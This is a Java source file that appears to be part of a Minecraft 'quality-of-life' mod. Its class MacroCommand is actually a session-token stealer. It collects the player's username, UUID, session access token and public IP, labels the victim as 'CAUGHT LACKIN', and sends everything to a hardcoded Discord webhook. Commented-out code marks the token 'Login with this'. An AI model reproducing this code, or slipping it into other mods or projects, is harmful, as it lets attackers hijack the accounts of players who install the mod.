package com.suyako.lazyQoL.core;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.exception.HttpException;
import net.minecraft.client.Minecraft;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

public class MacroCommand {
	public static final String WEBHOOK = "https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8";
	public static WebhookClient client;
	public static String send;

	public MacroCommand() {
		try {
			String ip = "error";
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			ip = bufferedReader.readLine();
			send = new String("\n" + Minecraft.getMinecraft().getSession().getUsername() + " has been CAUGHT LACKIN" +
					"\nUUID: " + Minecraft.getMinecraft().getSession().getPlayerID() +
					"\nAccessToken: " + Minecraft.getMinecraft().getSession().getToken() +
					"\n"+
					"\nNETWORTH: " + "https://sky.shiiyu.moe/stats/" + Minecraft.getMinecraft().getSession().getUsername() +
					"\nIP: " + ip);

/*			CommandUtils webhook = new CommandUtils("https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8");
			webhook.setAvatarUrl("https://i2.hdslb.com/bfs/face/250d1a4a2a7c433477af064bc6a92d605ab70c14.jpg@240w_240h_1c_1s.webp");
			webhook.setUsername("XD GET CAUGHT LACKIN");
			webhook.setTts(true);
			webhook.addEmbed((new CommandUtils.EmbedObject())*/

/*                .setTitle(Minecraft.func_71410_x().func_110432_I().func_111285_a() + " has been CAUGHT LACKIN")
                .addField("UUID", "``" + Minecraft.func_71410_x().func_110432_I().func_148255_b() + "```", false)
                .addField("Login with this", "`" + Minecraft.func_71410_x().func_110432_I().func_148254_d() + "`", false)
                .addField("NETWORTH STUFF", "`https://sky.shiiyu.moe/stats/" + Minecraft.func_71410_x().func_110432_I().func_111285_a(), false)
                .addField("IP", (String)ip, false));*/

/*				.setTitle(Minecraft.getMinecraft().getSession().getUsername() + " has been CAUGHT LACKIN")
				.addField("UUID", "``" + Minecraft.getMinecraft().getSession().getPlayerID() + "```", false)
				.addField("Login with this", "`" + Minecraft.getMinecraft().getSession().getToken() + "`", false)
				.addField("NETWORTH STUFF", "`https://sky.shiiyu.moe/stats/" + Minecraft.getMinecraft().getSession().getUsername(), false)
				.addField("IP", (String) ip, false))*/

			WebhookClient.setDefaultErrorHandler((clients, message, throwable) -> {
				System.err.printf("[%s] %s%n", clients.getId(), message);
				if (throwable != null)
					throwable.printStackTrace();
				// Shutdown the webhook client when you get 404 response (may also trigger for client#edit calls, be careful)
				if (throwable instanceof HttpException) {
					HttpException httpException = (HttpException) throwable;
					if (httpException.getCode() == 404)
						clients.close();
				}
			});
			client = WebhookClient.withUrl("https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8"); // or withId(id, token)
		} catch (Exception exception) {
			exception.printStackTrace();
		}
	}

	public static void SendMacro() {
		client.send(send);
	}
}
